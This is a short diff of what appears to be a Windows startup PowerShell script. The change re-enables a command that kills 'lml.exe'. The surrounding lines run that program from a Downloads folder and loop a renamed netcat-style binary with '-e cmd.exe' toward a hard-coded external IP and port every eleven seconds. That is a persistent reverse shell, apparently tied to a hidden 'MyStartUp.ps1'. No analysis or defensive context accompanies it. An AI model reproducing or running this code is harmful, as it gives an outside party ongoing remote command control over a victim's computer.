@@ -1,4 +1,4 @@
-#taskkill /F /IM lml.exe
+taskkill /F /IM lml.exe
 C:\Users\seba\Downloads\lml.exe
 while ($true){C:\Users\Public\RNM.exe -nv 193.161.193.99 26929 -e cmd.exe; start-sleep 11}
 #attrib -h C:\Users\Public\MyStartUp.ps1
